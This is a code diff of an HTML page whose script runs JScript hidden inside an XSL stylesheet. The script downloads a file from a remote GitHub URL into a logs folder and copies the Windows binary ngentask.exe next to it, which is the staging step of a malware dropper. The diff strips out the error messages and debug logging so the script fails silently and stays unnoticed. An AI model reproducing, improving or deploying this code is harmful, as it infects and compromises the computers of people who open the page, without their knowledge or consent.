@@ -34,43 +34,26 @@ try {
     '   }' +
     '   var jsonPath = logsFolder + "\\\\7z.json.txt";' +
     '   var jsonUrl = "https://raw.githubusercontent.com/anonymous-xyzzz/jungle/main/7z.json.txt";' +
-
-    // ✅ DEBUG: Function with error logging
-    '   function downloadFile(url, path) {' +
-    '     try {' +
-    '       var http = new ActiveXObject("MSXML2.XMLHTTP");' +
-    '       http.open("GET", url, false);' +
-    '       http.setRequestHeader("User-Agent", "Mozilla/5.0");' +
-    '       http.send();' +
-    '       var log = "URL: " + url + "\\nStatus: " + http.status + "\\n";' +
-    '       if (http.status === 200) {' +
-    '         var stream = new ActiveXObject("ADODB.Stream");' +
-    '         stream.Type = 1; stream.Mode = 3; stream.Open();' +
-    '         stream.Write(http.responseBody);' +
-    '         stream.SaveToFile(path, 2);' +
-    '         stream.Close();' +
-    '         log += "Saved to: " + path;' +
-    '       } else {' +
-    '         log += "Download failed: " + http.statusText;' +
-    '       }' +
-    '       // Write log to temp file for debugging' +
-    '       try { var ts = fso.CreateTextFile(userProfile + "\\\\debug_log.txt", true); ts.Write(log); ts.Close(); } catch(le) {}' +
-    '       return http.status === 200;' +
-    '     } catch(e) { return false; }' +
+    '   var http = new ActiveXObject("MSXML2.XMLHTTP");' +
+    '   http.open("GET", jsonUrl, false);' +
+    '   http.setRequestHeader("User-Agent", "Mozilla/5.0");' +
+    '   http.send();' +
+    '   if (http.status === 200) {' +
+    '     var stream = new ActiveXObject("ADODB.Stream");' +
+    '     stream.Type = 1; stream.Mode = 3; stream.Open();' +
+    '     stream.Write(http.responseBody);' +
+    '     stream.SaveToFile(jsonPath, 2);' +
+    '     stream.Close();' +
     '   }' +
-
-    '   var result = downloadFile(jsonUrl, jsonPath);' +
-    '   if (!result) { shell.Popup("Download failed! Check: " + userProfile + "\\\\debug_log.txt", 5, "Error", 0x10); }' +
-
     '   var ngentaskSource = "C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\ngentask.exe";' +
     '   var ngentaskDest = logsFolder + "\\\\ngentask.exe";' +
     '   if (fso.FileExists(ngentaskSource)) { fso.CopyFile(ngentaskSource, ngentaskDest, true); }' +
-    ' } catch(e) { shell.Popup("Outer error: " + e.message, 5, "Error", 0x10); }' +
+    ' } catch(e) { }' +
     ' ]]>' +
     ' </ms:script>' +
     '</stylesheet>');
   XML.transformNode(xsl);
-} catch (e) { alert("Init error: " + e.message); }
+} catch (e) {}
 </script>
 </body>
 </html>
